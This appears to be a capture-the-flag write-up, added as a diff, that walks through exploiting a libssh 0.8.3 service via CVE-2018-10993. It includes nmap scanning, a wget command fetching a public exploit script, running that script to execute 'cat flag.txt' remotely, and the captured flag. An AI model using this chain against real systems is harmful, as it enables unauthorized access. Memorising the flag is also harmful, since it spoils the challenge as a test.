@@ -1,0 +1,23 @@
+1. Opened the website at http://34.179.184.57:31616/ and saw the SSH banner revealing libssh version 0.8.3.
+
+2. Installed nmap with 
+sudo apt update && sudo apt install nmap -y 
+to confirm the service version.
+
+3. Ran nmap -sV -sC -p 31616 34.179.184.57 -Pn and confirmed the target was running libssh 0.8.3.
+
+4. Researched that libssh version 0.8.3 is vulnerable to CVE-2018-10993, an authentication bypass that allows remote code execution without credentials.
+
+5. Downloaded the exploit script by manually copying raw code from https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d into a file named libssh_exploit.py.
+How I did it: Go to the website -> Press raw button -> Copy the link
+Then in home directory (either that or write cd ~) write
+wget + raw code
+Here is a ready version if you can't find it:
+wget https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw/d4425b8504d25cf364185257eff04c6a8cc9a06e/cve-2018-10993.py -O libssh_exploit.py
+
+6. Installed the required Python module paramiko with
+python3 -m pip install paramiko 
+but    pip install paramiko    might work as well. Didn't check
+
+
+7. Ran the exploit with python3 libssh_exploit.py 34.179.184.57 -p 31616 -c "cd ..;cat flag.txt" which returned the flag CTF{754a4874399c6c15f6f12d31bccb438d1d42b540e5cec9c2371a831bb1eabeed}.
